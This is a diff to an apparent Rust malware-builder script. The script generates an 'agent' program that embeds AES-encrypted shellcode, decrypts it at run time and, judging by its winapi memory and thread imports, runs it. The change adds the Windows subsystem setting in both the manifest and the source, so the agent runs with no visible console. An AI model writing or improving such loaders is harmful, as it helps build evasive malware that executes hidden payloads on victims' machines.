@@ -74,10 +74,12 @@ winapi = {{ version = "0.3", features = ["winnt", "memoryapi", "processthreadsap
 [[bin]]
 name = "{}"
 path = "src/main.rs"
+windows_subsystem = "windows"
 "#, output_name, output_name);
 
     // Create the agent code with embedded encrypted data
-    let agent_code = format!(r#"use aes::Aes256;
+    let agent_code = format!(r#"#![windows_subsystem = "windows"]
+use aes::Aes256;
 use cbc::{{cipher::{{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}}, Decryptor}};
 use std::mem::transmute;
 use std::ptr::copy;
@@ -100,6 +102,7 @@ fn decrypt_shellcode() -> Vec<u8> {{
     let mut buffer = ENCRYPTED_SHELLCODE.to_vec();
     cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer).unwrap().to_vec()
 }}
+
 
 fn main() {{
     unsafe {{
